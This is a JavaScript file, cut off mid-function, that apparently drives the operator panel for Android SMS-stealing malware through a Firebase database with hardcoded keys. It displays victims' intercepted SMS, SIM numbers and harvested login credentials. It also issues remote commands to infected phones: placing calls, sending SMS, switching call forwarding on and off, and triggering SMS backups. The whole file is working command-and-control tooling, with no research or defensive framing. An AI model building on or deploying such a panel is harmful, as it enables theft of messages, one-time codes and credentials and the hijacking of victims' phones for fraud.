/* ============================================================ */
/* app.js - Fixed: Device Click par Online/Offline Check        */
/* ============================================================ */

// ============================================================
// FIREBASE CONFIG
// ============================================================
const firebaseConfig = {
    apiKey: "AIzaSyAzStFCeODQmVbydsq1yxPHryz-cqM8lrU",
    authDomain: "hello4211.firebaseapp.com",
    databaseURL: "https://hello4211-default-rtdb.firebaseio.com",
    projectId: "hello4211",
    storageBucket: "hello4211.firebasestorage.app",
    messagingSenderId: "11131576643",
    appId: "1:11131576643:web:64e4153cee7cb7847e4ff6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ============================================================
// STATE
// ============================================================
let cachedData = {};
let expandedDevices = {};
let activeTabs = {};
let isPanelOpen = { devices: true, sms: false, backup: false, analytics: false };
let formMemory = {};
let deviceOffset = 0;
const DEVICE_LIMIT = 5;
let allDeviceKeys = [];
let filteredDeviceKeys = [];
let currentFilter = 'all';
let allSmsList = [];
let allSmsOffset = 0;
const SMS_LIMIT = 10;
let modalSmsList = [];
let modalSmsOffset = 0;
let modalTarget = 'ALL';
let deviceSmsCache = {};
let smsFilterDevice = null;
let deviceSerialMap = {};
let isRendering = false;
let isUpdatingUI = false;
let deviceOnlineStatus = {};

// ============================================================
// DOM REFS
// ============================================================
const $ = (id) => document.getElementById(id);

// ============================================================
// CONNECTION MONITOR
// ============================================================
db.ref(".info/connected").on("value", (snap) => {
    const badge = $('statusBadge');
    const text = $('statusText');
    if (snap.val() === true) {
        badge.className = 'connection-status online';
        text.textContent = 'Online';
    } else {
        badge.className = 'connection-status offline';
        text.textContent = 'Offline';
    }
});

// ============================================================
// MAIN DATA LISTENER
// ============================================================
let firstLoad = true;
let lastData = {};

db.ref().on("value", (snapshot) => {
    const newData = snapshot.val() || {};
    
    if (JSON.stringify(newData) === JSON.stringify(lastData)) {
        return;
    }
    
    cachedData = newData;
    lastData = JSON.parse(JSON.stringify(newData));

    // Update device online status
    updateDeviceOnlineStatus();

    const active = document.activeElement;
    const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
    if (typing) return;

    if (!isRendering && !isUpdatingUI) {
        renderAll();
    }

    if (firstLoad) {
        firstLoad = false;
        if (!isPanelOpen.devices) {
            togglePanel('devices');
        }
    }
});

// ============================================================
// UPDATE DEVICE ONLINE STATUS - REAL TIME CHECK
// ============================================================
function updateDeviceOnlineStatus() {
    const devices = cachedData.user_data || {};
    Object.keys(devices).forEach(devId => {
        const dev = devices[devId];
        // Check online status from multiple sources
        const isOnline = dev.isOnline || dev.online || false;
        const lastSeen = dev.last_online || dev.timestamp || 0;
        const currentTime = Date.now();
        
        // If last seen within 2 minutes, consider online
        const isRecent = (currentTime - lastSeen) < 120000;
        
        deviceOnlineStatus[devId] = isOnline || isRecent;
    });
}

// ============================================================
// CHECK DEVICE ONLINE STATUS - CLICK PAR CHECK
// ============================================================
function checkDeviceStatus(devId) {
    if (!devId) return;
    
    const statusEl = document.getElementById(`status-${devId}`);
    const timeEl = document.getElementById(`time-${devId}`);
    
    if (!statusEl) return;
    
    // Show loading state
    statusEl.textContent = '⏳ Checking...';
    statusEl.className = 'device-status checking';
    
    // First check from cache
    const cachedStatus = deviceOnlineStatus[devId] || false;
    
    // Then check from Firebase directly
    db.ref(`user_data/${devId}`).once('value').then(snap => {
        if (snap.exists()) {
            const dev = snap.val();
            const isOnline = dev.isOnline || dev.online || false;
            const lastSeen = dev.last_online || dev.timestamp || 0;
            const currentTime = Date.now();
            const isRecent = (currentTime - lastSeen) < 120000;
            const finalStatus = isOnline || isRecent;
            
            // Update cache
            deviceOnlineStatus[devId] = finalStatus;
            
            // Update UI
            updateDeviceStatusUI(devId, finalStatus, lastSeen);
            
            // Show toast with status
            showToast(`📱 ${devId}: ${finalStatus ? '🟢 Online' : '🔴 Offline'}`, finalStatus ? 'success' : 'error');
        } else {
            statusEl.textContent = '❌ Device Not Found';
            statusEl.className = 'device-status offline';
            showToast('❌ Device not found', 'error');
        }
    }).catch(err => {
        statusEl.textContent = '❌ Error checking';
        statusEl.className = 'device-status offline';
        showToast('❌ Error checking status', 'error');
    });
}

// ============================================================
// UPDATE DEVICE STATUS UI
// ============================================================
function updateDeviceStatusUI(devId, isOnline, lastSeen) {
    const statusEl = document.getElementById(`status-${devId}`);
    const timeEl = document.getElementById(`time-${devId}`);
    
    if (statusEl) {
        const statusText = isOnline ? '● Online' : '● Offline';
        const statusClass = isOnline ? 'online' : 'offline';
        statusEl.textContent = statusText;
        statusEl.className = `device-status ${statusClass}`;
    }
    
    if (timeEl) {
        const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
        timeEl.textContent = `⏱ ${timeStr}`;
    }
}

// ============================================================
// RENDER ALL
// ============================================================
function renderAll() {
    if (isRendering || isUpdatingUI) return;
    isRendering = true;
    
    try {
        updateDeviceOnlineStatus();
        renderDevices();
        renderAllSms();
        renderAnalytics();
        updateBackupDeviceList();

        const devices = cachedData.user_data || {};
        const keys = Object.keys(devices);
        $('deviceCount').textContent = keys.length;
        $('panelDeviceCount').textContent = keys.length;

        const smsData = cachedData.user_sms || {};
        let totalSms = 0;
        Object.keys(smsData).forEach(d => {
            totalSms += Object.keys(smsData[d]).length;
        });
        $('smsCount').textContent = totalSms;
        $('panelSmsCount').textContent = totalSms;

        if (isPanelOpen.backup) {
            const selected = $('backupDeviceSelect').value;
            if (selected) {
                updateBackupStatusDisplay(selected);
                loadBackupSmsForDevice(selected);
            }
        }
    } finally {
        isRendering = false;
    }
}

// ============================================================
// TOGGLE PANEL
// ============================================================
function togglePanel(panel) {
    const panels = ['devices', 'sms', 'backup', 'analytics'];

    panels.forEach(p => {
        if (p !== panel) {
            const el = $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`);
            if (el) el.classList.remove('active');
            const nav = document.querySelector(`.nav-item[data-panel="${p}"]`);
            if (nav) nav.classList.remove('active');
            isPanelOpen[p] = false;
        }
    });

    const panelEl = $(`panel${panel.charAt(0).toUpperCase() + panel.slice(1)}`);
    const nav = document.querySelector(`.nav-item[data-panel="${panel}"]`);

    if (panelEl) {
        isPanelOpen[panel] = !isPanelOpen[panel];
        if (isPanelOpen[panel]) {
            panelEl.classList.add('active');
            if (nav) nav.classList.add('active');
            if (panel === 'devices') renderDevices();
            if (panel === 'sms') renderAllSms();
            if (panel === 'analytics') renderAnalytics();
            if (panel === 'backup') {
                updateBackupDeviceList();
                const selected = $('backupDeviceSelect').value;
                if (selected) {
                    updateBackupStatusDisplay(selected);
                    loadBackupSmsForDevice(selected);
                }
            }
        } else {
            panelEl.classList.remove('active');
            if (nav) nav.classList.remove('active');
        }
    }
}

// ============================================================
// FILTER DEVICES
// ============================================================
function filterDevices(filter) {
    currentFilter = filter;
    deviceOffset = 0;

    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
    if (filter === 'all') $('filterAll').classList.add('active');
    else if (filter === 'online') $('filterOnline').classList.add('active');
    else if (filter === 'offline') $('filterOffline').classList.add('active');

    renderDevices();
}

// ============================================================
// GET DEVICE ONLINE STATUS
// ============================================================
function isDeviceOnline(devId) {
    // First check cached status
    if (deviceOnlineStatus[devId] !== undefined) {
        return deviceOnlineStatus[devId];
    }
    
    // Fallback to checking from data
    const dev = cachedData.user_data?.[devId];
    if (!dev) return false;
    
    const online = dev.isOnline || dev.online || false;
    const lastSeen = dev.last_online || dev.timestamp || 0;
    const isRecent = (Date.now() - lastSeen) < 120000;
    
    const status = online || isRecent;
    deviceOnlineStatus[devId] = status;
    return status;
}

// ============================================================
// GET DEVICE SERIAL NUMBER - CACHED
// ============================================================
function getDeviceSerial(devId) {
    if (deviceSerialMap[devId]) return deviceSerialMap[devId];
    
    const dev = cachedData.user_data?.[devId];
    if (dev) {
        let serial = dev.user_serial || dev.uesr_serial || 0;
        if (typeof serial === 'string') serial = parseInt(serial) || 0;
        deviceSerialMap[devId] = serial;
        return serial;
    }
    return 0;
}

// ============================================================
// RENDER DEVICES - WITH ONLINE CHECK BUTTON
// ============================================================
function renderDevices() {
    if (isUpdatingUI) return;
    const container = $('devicesContainer');
    const devices = cachedData.user_data || {};
    allDeviceKeys = Object.keys(devices);

    // Update online status for all devices
    updateDeviceOnlineStatus();

    allDeviceKeys.sort((a, b) => {
        const serialA = getDeviceSerial(a);
        const serialB = getDeviceSerial(b);
        return serialB - serialA;
    });

    if (currentFilter === 'online') {
        filteredDeviceKeys = allDeviceKeys.filter(id => isDeviceOnline(id));
    } else if (currentFilter === 'offline') {
        filteredDeviceKeys = allDeviceKeys.filter(id => !isDeviceOnline(id));
    } else {
        filteredDeviceKeys = [...allDeviceKeys];
    }

    if (filteredDeviceKeys.length === 0) {
        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-mobile-alt" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${currentFilter === 'all' ? 'No devices registered' : 'No ' + currentFilter + ' devices'}</div>`;
        return;
    }

    const start = deviceOffset;
    const end = Math.min(start + DEVICE_LIMIT, filteredDeviceKeys.length);
    const displayKeys = filteredDeviceKeys.slice(start, end);
    const hasMore = end < filteredDeviceKeys.length;

    let html = '';

    displayKeys.forEach((devId, index) => {
        const dev = devices[devId] || {};
        const serial = getDeviceSerial(devId);
        const deviceNumber = start + index + 1;

        const online = isDeviceOnline(devId);
        const lastSeen = dev.last_online || dev.timestamp;
        const statusClass = online ? 'online' : 'offline';
        const statusText = online ? '● Online' : '● Offline';
        const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';

        const smsData = cachedData.user_sms || {};
        let devSmsList = [];
        let totalSms = 0;
        if (smsData[devId]) {
            const keys = Object.keys(smsData[devId]);
            totalSms = keys.length;
            if (!deviceSmsCache[devId]) {
                deviceSmsCache[devId] = { offset: 0, all: [] };
                keys.forEach(k => deviceSmsCache[devId].all.push(smsData[devId][k]));
            }
            const cache = deviceSmsCache[devId];
            const startIdx = cache.offset;
            const endIdx = Math.min(startIdx + SMS_LIMIT, cache.all.length);
            devSmsList = cache.all.slice(startIdx, endIdx).reverse();
        }

        const isExpanded = expandedDevices[devId] || false;
        const activeTab = activeTabs[devId] || null;
        const hasMoreSms = deviceSmsCache[devId] &&
            (deviceSmsCache[devId].offset + SMS_LIMIT < deviceSmsCache[devId].all.length);

        const loginData = cachedData.login || {};
        let devLoginList = [];
        if (loginData[devId]) {
            Object.keys(loginData[devId]).forEach(k => devLoginList.push(loginData[devId][k]));
            devLoginList.reverse();
        }

        let allLoginHtml = '';
        if (devLoginList.length > 0) {
            allLoginHtml = devLoginList.map((rec, idx) => {
                let fields = '';
                for (let k in rec) {
                    if (k === 'key' || k === 'timestamp') continue;
                    fields += `<div class="login-field">
                        <span class="field-label">${k}:</span>
                        <span class="field-value" id="field-${devId}-${idx}-${k}">${rec[k]}</span>
                        <button class="copy-field-btn" onclick="copyField('field-${devId}-${idx}-${k}')"><i class="fas fa-copy"></i></button>
                    </div>`;
                }
                return `<div class="login-card">
                    <div class="login-card-header">Record ${idx+1}</div>
                    <div class="login-card-body">${fields}</div>
                </div>`;
            }).join('');
        }

        html += `
            <div class="device-card-luxury ${isExpanded ? 'expanded' : ''}" id="card-${devId}">
                <div class="device-top" onclick="toggleDevice('${devId}')">
                    <div>
                        <div class="device-name">
                            <span class="device-serial-badge">#${deviceNumber}</span>
                            📱 ${devId}
                            ${serial > 0 ? `<span class="device-serial-badge" style="background:rgba(16,185,129,0.12);color:var(--green);border-color:rgba(16,185,129,0.2);">S-${serial}</span>` : ''}
                        </div>
                        <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">
                            ${isExpanded ? '▲ Click to collapse' : '▼ Click to expand'}
                        </div>
                    </div>
                    <div style="text-align:right;">
                        <span class="device-status ${statusClass}" id="status-${devId}">${statusText}</span>
                        <div style="font-size:9px;color:var(--text-muted);margin-top:2px;" id="time-${devId}">⏱ ${timeStr}</div>
                        <button class="check-status-btn" onclick="event.stopPropagation();checkDeviceStatus('${devId}')" title="Check Online Status">
                            <i class="fas fa-sync-alt"></i>
                        </button>
                    </div>
                </div>

                <div class="device-info-grid" onclick="toggleDevice('${devId}')">
                    <div class="item"><span>Device</span><b>${dev.Device_info || 'N/A'}</b></div>
                    <div class="item"><span>SIM 1</span><b>${dev.numberSim1 || 'N/A'}</b></div>
                    <div class="item"><span>SIM 2</span><b>${dev.numberSim2 || 'N/A'}</b></div>
                    ${serial > 0 ? `<div class="item"><span>Serial</span><b style="color:var(--gold);">${serial}</b></div>` : ''}
                </div>

                <div class="device-body">
                    <div class="device-actions-luxury">
                        <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">
                            💬 ${totalSms}
                        </button>
                        <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">
                            🔑 ${devLoginList.length}
                        </button>
                        <button class="sub-btn ${activeTab === 'call' ? 'active-call' : ''}" onclick="event.stopPropagation();setTab('${devId}','call')">📞</button>
                        <button class="sub-btn ${activeTab === 'sendsms' ? 'active-sendsms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sendsms')">✉️</button>
                        <button class="sub-btn ${activeTab === 'fwd' ? 'active-fwd' : ''}" onclick="event.stopPropagation();setTab('${devId}','fwd')">🔀</button>
                        <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
                    </div>

                    <!-- SMS Section -->
                    <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                            <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
                            <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
                        </div>
                        <div class="sms-list-luxury">
                            ${renderSmsCards(devSmsList)}
                            ${devSmsList.length === 0 ? '<div class="empty-luxury">No SMS</div>' : ''}
                        </div>
                        ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                    </div>

                    <!-- Login Section -->
                    <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
                        <h4 style="color:#f59e0b;font-size:13px;">🔑 All Credentials</h4>
                        <div class="login-cards">
                            ${devLoginList.length === 0 ? '<div class="empty-luxury">No credentials found</div>' : allLoginHtml}
                        </div>
                    </div>

                    <!-- Call Section -->
                    <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
                        <h4 style="color:var(--green);font-size:13px;">📞 Make Call</h4>
                        <input type="text" id="callNum-${devId}" value="${formMemory[`callNum-${devId}`] || ''}" placeholder="Phone Number" oninput="formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
                        <select id="callSim-${devId}" onchange="formMemory['callSim-${devId}']=this.value" onclick="event.stopPropagation()">
                            <option value="0" ${(formMemory[`callSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                            <option value="1" ${(formMemory[`callSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                        </select>
                        <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('call','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                            <i class="fas fa-phone"></i> Call
                        </button>
                    </div>

                    <!-- Send SMS Section -->
                    <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
                        <h4 style="color:var(--purple);font-size:13px;">✉️ Send SMS</h4>
                        <input type="text" id="smsNum-${devId}" value="${formMemory[`smsNum-${devId}`] || ''}" placeholder="Recipient" oninput="formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
                        <textarea id="smsText-${devId}" placeholder="Message" rows="2" oninput="formMemory['smsText-${devId}']=this.value" onclick="event.stopPropagation()">${formMemory[`smsText-${devId}`] || ''}</textarea>
                        <select id="smsSim-${devId}" onchange="formMemory['smsSim-${devId}']=this.value" onclick="event.stopPropagation()">
                            <option value="1" ${(formMemory[`smsSim-${devId}`] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
                            <option value="2" ${(formMemory[`smsSim-${devId}`] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
                        </select>
                        <button class="btn-luxury btn-blue" onclick="event.stopPropagation();showCommandDialog('sms','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                            <i class="fas fa-paper-plane"></i> Send
                        </button>
                    </div>

                    <!-- Forward Section -->
                    <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
                        <h4 style="color:var(--red);font-size:13px;">🔀 Call Forward</h4>
                        <input type="text" id="fwdNum-${devId}" value="${formMemory[`fwdNum-${devId}`] || ''}" placeholder="Forward To" oninput="formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
                        <select id="fwdSim-${devId}" onchange="formMemory['fwdSim-${devId}']=this.value" onclick="event.stopPropagation()">
                            <option value="0" ${(formMemory[`fwdSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                            <option value="1" ${(formMemory[`fwdSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                        </select>
                        <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();showCommandDialog('fwd_on','${devId}')">
                            <i class="fas fa-play"></i> Activate
                        </button>
                        <button class="btn-luxury btn-red" onclick="event.stopPropagation();showCommandDialog('fwd_off','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                            <i class="fas fa-stop"></i> Deactivate
                        </button>
                    </div>

                    <!-- Backup Section -->
                    <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
                        <h4 style="color:#06b6d4;font-size:13px;">💾 Backup</h4>
                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
                            <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('backup','${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
                                <i class="fas fa-database"></i> Backup
                            </button>
                            <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
                                <i class="fas fa-sync"></i> Refresh
                            </button>
                        </div>
                        <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
                            Click Refresh to check status
                        </div>
                    </div>
                </div>
            </div>
        `;
    });

    container.innerHTML = html;

    if (hasMore) {
        const remaining = filteredDeviceKeys.length - end;
        container.innerHTML += `
            <button class="btn-load-more" onclick="loadMoreDevices()">
                <i class="fas fa-chevron-down"></i> Load More (${remaining} remaining)
            </button>
        `;
    }

    if (deviceOffset > 0) {
        const backBtn = document.createElement('button');
        backBtn.className = 'btn-load-more';
        backBtn.style.marginBottom = '10px';
        backBtn.innerHTML = '<i class="fas fa-chevron-up"></i> Back';
        backBtn.onclick = function() {
            deviceOffset = Math.max(0, deviceOffset - DEVICE_LIMIT);
            renderDevices();
        };
        container.insertBefore(backBtn, container.firstChild);
    }
}

// ============================================================
// TOGGLE DEVICE - NO FULL RE-RENDER
// ============================================================
function toggleDevice(devId) {
    if (isUpdatingUI) return;
    isUpdatingUI = true;
    
    try {
        expandedDevices[devId] = !expandedDevices[devId];
        
        const card = document.getElementById(`card-${devId}`);
        if (card) {
            card.classList.toggle('expanded');
            
            const hint = card.querySelector('.device-top .device-name + div');
            if (hint) {
                hint.textContent = expandedDevices[devId] ? '▲ Click to collapse' : '▼ Click to expand';
            }
            
            // Auto-check status when expanding
            if (expandedDevices[devId]) {
                setTimeout(() => checkDeviceStatus(devId), 100);
            }
        }
    } finally {
        isUpdatingUI = false;
    }
}

// ============================================================
// SET TAB
// ============================================================
function setTab(devId, tab) {
    if (isUpdatingUI) return;
    isUpdatingUI = true;
    
    try {
        if (activeTabs[devId] === tab) {
            activeTabs[devId] = null;
        } else {
            activeTabs[devId] = tab;
            if (tab === 'backup') refreshDeviceBackup(devId);
        }
        
        const card = document.getElementById(`card-${devId}`);
        if (!card) return;

        const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
        buttons.forEach(btn => {
            btn.className = btn.className.replace(/active-\w+/g, '').trim();
        });

        const sections = card.querySelectorAll('.section-box');
        sections.forEach(sec => sec.classList.remove('active'));

        const targetTab = activeTabs[devId];
        if (targetTab) {
            const activeSec = card.querySelector(`#sec-${targetTab}-${devId}`);
            if (activeSec) activeSec.classList.add('active');

            buttons.forEach(btn => {
                if (btn.textContent.trim().includes('💬') && targetTab === 'sms') btn.classList.add('active-sms');
                else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') btn.classList.add('active-login');
                else if (btn.textContent.trim().includes('📞') && targetTab === 'call') btn.classList.add('active-call');
                else if (btn.textContent.trim().includes('✉️') && targetTab === 'sendsms') btn.classList.add('active-sendsms');
                else if (btn.textContent.trim().includes('🔀') && targetTab === 'fwd') btn.classList.add('active-fwd');
                else if (btn.textContent.trim().includes('💾') && targetTab === 'backup') btn.classList.add('active-backup');
            });
        }
    } finally {
        isUpdatingUI = false;
    }
}

// ============================================================
// LOAD MORE DEVICES
// ============================================================
function loadMoreDevices() {
    deviceOffset += DEVICE_LIMIT;
    renderDevices();
}

// ============================================================
// RENDER SMS CARDS
// ============================================================
function renderSmsCards(list, showDevice = false) {
    if (!list || list.length === 0) return '';
    return list.map(msg => `
        <div class="sms-card-luxury">
            <div class="sms-header">
                <div class="sms-sender">
                    ${showDevice ? `<span class="device-tag" onclick="filterSmsByDevice('${msg.deviceId}')">[${msg.deviceId}]</span> ` : ''}
                    👤 ${msg.sender || msg.address || 'Unknown'}
                </div>
                <div class="sms-meta">
                    ${msg.date_formatted || msg.date || ''} ${msg.sim_number ? '• ' + msg.sim_number : ''}
                </div>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
        </div>
    `).join('');
}

// ============================================================
// FILTER SMS BY DEVICE
// ============================================================
function filterSmsByDevice(deviceId) {
    smsFilterDevice = deviceId;
    $('clearSmsFilterBtn').style.display = 'inline-block';
    allSmsOffset = 0;
    showToast(`📱 Filtering: ${deviceId}`, 'info');

    if (!isPanelOpen.sms) {
        togglePanel('sms');
    } else {
        renderAllSms();
    }
}

function clearSmsFilter() {
    smsFilterDevice = null;
    $('clearSmsFilterBtn').style.display = 'none';
    allSmsOffset = 0;
    renderAllSms();
    showToast('✅ Filter cleared', 'success');
}

// ============================================================
// RENDER ALL SMS
// ============================================================
function renderAllSms() {
    const container = $('allSmsContainer');
    const loadMore = $('allSmsLoadMore');

    if (allSmsOffset === 0) {
        allSmsList = [];
        const smsData = cachedData.user_sms || {};
        Object.keys(smsData).forEach(devId => {
            if (smsFilterDevice && smsFilterDevice !== devId) return;
            const msgs = smsData[devId];
            Object.keys(msgs).forEach(k => {
                allSmsList.push({ deviceId: devId, ...msgs[k] });
            });
        });
        allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

        if (smsFilterDevice) {
            $('panelSmsCount').textContent = allSmsList.length + ' (filtered)';
        } else {
            $('panelSmsCount').textContent = allSmsList.length;
        }
    }

    if (allSmsList.length === 0) {
        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${smsFilterDevice ? 'No messages for ' + smsFilterDevice : 'No messages found'}</div>`;
        loadMore.style.display = 'none';
        return;
    }

    const start = allSmsOffset;
    const end = Math.min(start + SMS_LIMIT, allSmsList.length);
    const paginated = allSmsList.slice(start, end);

    if (allSmsOffset === 0) {
        container.innerHTML = renderSmsCards(paginated, true);
    } else {
        container.innerHTML += renderSmsCards(paginated, true);
    }

    if (end < allSmsList.length) {
        loadMore.style.display = 'block';
        loadMore.textContent = `📥 Load More (${allSmsList.length - end} remaining)`;
    } else {
        loadMore.style.display = 'none';
    }
}

function loadMoreAllSms() {
    allSmsOffset += SMS_LIMIT;
    renderAllSms();
}

function loadMoreDeviceSms(devId) {
    if (deviceSmsCache[devId]) {
        deviceSmsCache[devId].offset += SMS_LIMIT;
        renderDevices();
        expandedDevices[devId] = true;
        activeTabs[devId] = 'sms';
        const cardEl = document.getElementById(`card-${devId}`);
        if (cardEl) cardEl.classList.add('expanded');
    }
}

// ============================================================
// RENDER ANALYTICS
// ============================================================
function renderAnalytics() {
    const devices = cachedData.user_data || {};
    $('analyticsTotalDevices').textContent = Object.keys(devices).length;

    const smsData = cachedData.user_sms || {};
    let totalSms = 0;
    Object.keys(smsData).forEach(d => totalSms += Object.keys(smsData[d]).length);
    $('analyticsTotalSms').textContent = totalSms;

    const backupData = cachedData.backup_sms || {};
    let backupCount = 0;
    Object.keys(backupData).forEach(d => backupCount += Object.keys(backupData[d]).length);
    $('analyticsBackupSms').textContent = backupCount;

    let latest = 0;
    Object.keys(smsData).forEach(d => {
        const msgs = smsData[d];
        Object.keys(msgs).forEach(k => {
            const ts = msgs[k].timestamp || 0;
            if (ts > latest) latest = ts;
        });
    });
    if (latest > 0) {
        const d = new Date(latest);
        $('analyticsLastActivity').textContent = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    } else {
        $('analyticsLastActivity').textContent = '—';
    }
}

// ============================================================
// COPY FIELD
// ============================================================
function copyField(fieldId) {
    const el = document.getElementById(fieldId);
    if (!el) return;
    const text = el.textContent;
    navigator.clipboard.writeText(text).then(() => {
        showToast('📋 Copied: ' + text.substring(0, 30) + (text.length > 30 ? '...' : ''), 'success');
        el.style.color = 'var(--gold)';
        setTimeout(() => el.style.color = '', 800);
    }).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast('📋 Copied!', 'success');
    });
}

// ============================================================
// SHOW COMMAND DIALOG
// ============================================================
function showCommandDialog(type, devId) {
    const messages = {
        'call': '📞 Send CALL command to this device?',
        'sms': '✉️ Send SMS command to this device?',
        'fwd_on': '🔀 Activate CALL FORWARDING on this device?',
        'fwd_off': '🔀 Deactivate CALL FORWARDING on this device?',
        'backup': '💾 Trigger SMS BACKUP on this device?'
    };

    if (!confirm(messages[type] || 'Send command?')) return;

    switch (type) {
        case 'call':
            sendCall(devId);
            break;
        case 'sms':
            sendSms(devId);
            break;
        case 'fwd_on':
            sendFwd(devId, 'call forward');
            break;
        case 'fwd_off':
            sendFwd(devId, 'forward off');
            break;
        case 'backup':
            triggerDeviceBackup(devId);
            break;
    }
}

// ============================================================
// COMMAND FUNCTIONS
// ============================================================
function sendCall(devId) {
    const number = $(`callNum-${devId}`).value.trim();
    const simSlot = $(`callSim-${devId}`).value;
    if (!number) return showToast('Enter phone number!', 'warning');

    db.ref(`user_data/${devId}`).update({
        device: devId,
        simSlot: simSlot,
        adminNumber: number,
        command: 'make call',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Call sent to ${devId}`, 'success');
        $(`callNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendSms(devId) {
    const number = $(`smsNum-${devId}`).value.trim();
    const text = $(`smsText-${devId}`).value.trim();
    const simSlot = $(`smsSim-${devId}`).value;
    if (!number || !text) return showToast('Enter both number and message!', 'warning');

    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        phoneNumber: number,
        messageText: text,
        simSlot: simSlot,
        command: 'send message',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ SMS sent to ${devId}`, 'success');
        $(`smsNum-${devId}`).value = '';
        $(`smsText-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendFwd(devId, cmd) {
    const number = $(`fwdNum-${devId}`).value.trim();
    const simSlot = $(`fwdSim-${devId}`).value;
    if (cmd === 'call forward' && !number) return showToast('Enter forward number!', 'warning');

    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        simSlot: simSlot,
        phoneNumber: number || '',
        command: cmd,
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Forward (${cmd}) sent`, 'success');
        $(`fwdNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// BACKUP FUNCTIONS
// ============================================================
function updateBackupDeviceList() {
    const select = $('backupDeviceSelect');
    const devices = cachedData.user_data || {};
    const keys = Object.keys(devices);
    const current = select.value;
    select.innerHTML = '<option value="">— Select a device —</option>';
    keys.forEach(id => {
        const dev = devices[id];
        const name = dev.d_name || dev.device_name || id;
        const serial = getDeviceSerial(id);
        const label = serial > 0 ? `#${serial} ${name}` : name;
        select.innerHTML += `<option value="${id}">${label}</option>`;
    });
    if (current && keys.includes(current)) select.value = current;
}

function updateBackupStatusDisplay(devId) {
    const dev = cachedData.user_data?.[devId];
    if (!dev) {
        $('backupStatusValue').textContent = 'Device not found';
        $('backupStatusValue').className = 'status-value failed';
        return;
    }

    const status = dev.backup_status || {};
    const info = dev.backup_info || {};

    const st = status.backup_status || 'No backup';
    const msg = status.backup_message || '';

    const statusEl = $('backupStatusValue');
    if (st === 'success') {
        statusEl.textContent = '✅ ' + (msg || 'Backup successful');
